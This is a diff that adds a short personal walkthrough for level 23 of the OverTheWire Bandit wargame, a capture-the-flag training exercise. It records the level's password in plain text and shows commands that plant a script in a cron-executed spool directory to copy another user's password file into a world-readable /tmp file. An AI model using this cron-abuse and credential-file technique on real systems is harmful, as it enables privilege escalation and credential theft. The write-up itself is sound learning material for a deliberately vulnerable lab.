@@ -1,0 +1,22 @@
+#Lvl : 23
+
+#Logged into level using password from Lvl 22: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+
+cat /etc/cron.d/cronjob_bandit24
+
+cat /usr/bin/cronjob_bandit24.sh 
+
+nano /var/spool/bandit24/foo/jg.sh   //jg is a preferred name
+
+/* jg.sh script */ cat /etc/bandit_pass/bandit24 > /tmp/...jg_bandit24_pass.txt
+
+echo 'cat /etc/bandit_pass/bandit24 > /tmp/...jg_bandit24_pass.txt; chmod 777 /tmp/...jg_bandit24_pass.txt' > 
+/var/spool/bandit24/foo/jg.sh; chmod +x /var/spool/bandit24/foo/jg.sh
+
+# Successfully read cron files similar to the previous levels. 
+# This time I created a shell script in the /var/spool/bandit24/foo/ directory for the cronjob to execute, 
+# which uses our script to copy the password for the next level into our own file under the /tmp directory
+
+#Password is stored in Level24
